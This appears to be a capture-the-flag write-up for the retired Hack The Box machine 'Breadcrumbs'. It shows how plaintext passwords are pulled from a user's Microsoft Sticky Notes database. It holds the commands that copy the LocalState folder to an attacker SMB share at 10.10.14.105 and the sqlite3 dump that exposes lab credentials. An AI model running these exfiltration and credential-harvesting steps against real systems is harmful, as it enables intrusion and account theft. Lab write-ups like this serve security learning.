# Shell as development user
## Found todo.html in desktop folder of juliette
```powershell
PS C:\Users\juliette\Desktop> ls


    Directory: C:\Users\juliette\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         12/9/2020   6:27 AM            753 todo.html
-ar---         7/29/2021  10:26 PM             34 user.txt


PS C:\Users\juliette\Desktop> type todo.html
<html>
<style>
html{
background:black;
color:orange;
}
table,th,td{
border:1px solid orange;
padding:1em;
border-collapse:collapse;
}
</style>
<table>
        <tr>
            <th>Task</th>
            <th>Status</th>
            <th>Reason</th>
        </tr>
        <tr>
            <td>Configure firewall for port 22 and 445</td>
            <td>Not started</td>
            <td>Unauthorized access might be possible</td>
        </tr>
        <tr>
            <td>Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager</td>
            <td>In progress</td>
            <td>It stores passwords in plain text</td>
        </tr>
        <tr>
            <td>Add new features to password manager</td>
            <td>Not started</td>
            <td>To get promoted, hopefully lol</td>
        </tr>
</table>

</html>
```
which tells that something be interesting in sticky notes application folder.
## Going in Sticky notes application folder
Going in sticky notes application folder `C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState` gives following files.
```powershell
PS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState> ls


    Directory: C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/15/2021   4:10 PM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----        11/29/2020   3:10 AM           4096 plum.sqlite
-a----         1/15/2021   4:10 PM          32768 plum.sqlite-shm
-a----         1/15/2021   4:10 PM         329632 plum.sqlite-wal


PS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState>
```
## copying whole `LocalState` folder to kali via smbserver
Started impacket smbserver  using  command`impacket-smbserver -smb2support files $(pwd)` and then copied folder `LocalState` to local kali vm using command `copy -R LocalState \\10.10.14.105\files\`.
![[Pasted image 20210730140720.png]]
## opening sqlite database file in sqlite3 and getting `Development` User creds
```bash
~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired/LocalState ❯ sqlite3 plum.sqlite
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "Note" (
"Text" varchar ,
"WindowPosition" varchar ,
"IsOpen" integer ,
"IsAlwaysOnTop" integer ,
"CreationNoteIdAnchor" varchar ,
"Theme" varchar ,
"IsFutureNote" integer ,
"RemoteId" varchar ,
"ChangeKey" varchar ,
"LastServerVersion" varchar ,
"RemoteSchemaVersion" integer ,
"IsRemoteDataInvalid" integer ,
"Type" varchar ,
"Id" varchar primary key not null ,
"ParentId" varchar ,
"CreatedAt" bigint ,
"DeletedAt" bigint ,
"UpdatedAt" bigint );
INSERT INTO Note VALUES(replace('\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!\n\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g\n\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]','\n',char(10)),'ManagedPosition=',1,0,NULL,'Yellow',0,NULL,NULL,NULL,NULL,NULL,NULL,'0c32c3d8-7c60-48ae-939e-798df198cfe7','8e814e57-9d28-4288-961c-31c806338c5b',637423162765765332,NULL,637423163995607122);
CREATE TABLE IF NOT EXISTS "Stroke" (
"Data" blob ,
"FormatVersion" integer ,
"Type" varchar ,
"Id" varchar primary key not null ,
"ParentId" varchar ,
"CreatedAt" bigint ,
"DeletedAt" bigint ,
"UpdatedAt" bigint );
CREATE TABLE IF NOT EXISTS "StrokeMetadata" (
"InsightId" varchar ,
"OffsetAngle" float ,
"RotationPointX" float ,
"RotationPointY" float ,
"OffsetX" float ,
"OffsetY" float ,
"ReminderId" varchar ,
"StrokeId" varchar ,
"Type" varchar ,
"Id" varchar primary key not null ,
"ParentId" varchar ,
"CreatedAt" bigint ,
"DeletedAt" bigint ,
"UpdatedAt" bigint );
CREATE TABLE IF NOT EXISTS "User" (
"Type" varchar ,
"Id" varchar primary key not null ,
"ParentId" varchar ,
"CreatedAt" bigint ,
"DeletedAt" bigint ,
"UpdatedAt" bigint );
INSERT INTO User VALUES(NULL,'8e814e57-9d28-4288-961c-31c806338c5b','8e814e57-9d28-4288-961c-31c806338c5b',637422450113001719,NULL,637422450113001719);
CREATE TABLE IF NOT EXISTS "SyncState" (
"OutboundQueueJson" varchar ,
"DeltaToken" varchar ,
"UnverifiedNotes" varchar ,
"SchemaVersion" integer ,
"Type" varchar ,
"Id" varchar primary key not null ,
"ParentId" varchar ,
"CreatedAt" bigint ,
"DeletedAt" bigint ,
"UpdatedAt" bigint );
CREATE TABLE IF NOT EXISTS "UpgradedNote" (
"OldNoteId" varchar ,
"NewNoteId" varchar ,
"UpgradeManagerVersion" integer ,
"UpgraderVersion" integer ,
"ModifiedByUser" integer ,
"Type" varchar ,
"Id" varchar primary key not null ,
"ParentId" varchar ,
"CreatedAt" bigint ,
"DeletedAt" bigint ,
"UpdatedAt" bigint );
CREATE TABLE IF NOT EXISTS "Media" (
"LocalFileRelativePath" varchar ,
"RemoteId" varchar ,
"MimeType" varchar ,
"AltText" varchar ,
"IsOrphaned" integer ,
"Height" integer ,
"Width" integer ,
"Type" varchar ,
"Id" varchar primary key not null ,
"ParentId" varchar ,
"CreatedAt" bigint ,
"DeletedAt" bigint ,
"UpdatedAt" bigint );
COMMIT;
sqlite> .tables
Media           Stroke          SyncState       User
Note            StrokeMetadata  UpgradedNote
sqlite> select * from Note;
\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]|ManagedPosition=|1|0||Yellow|0|||||||0c32c3d8-7c60-48ae-939e-798df198cfe7|8e814e57-9d28-4288-961c-31c806338c5b|637423162765765332||637423163995607122
sqlite>
```
![[Pasted image 20210730145925.png]]
# SSH logging in as `development` user
![[Pasted image 20210730150145.png]]



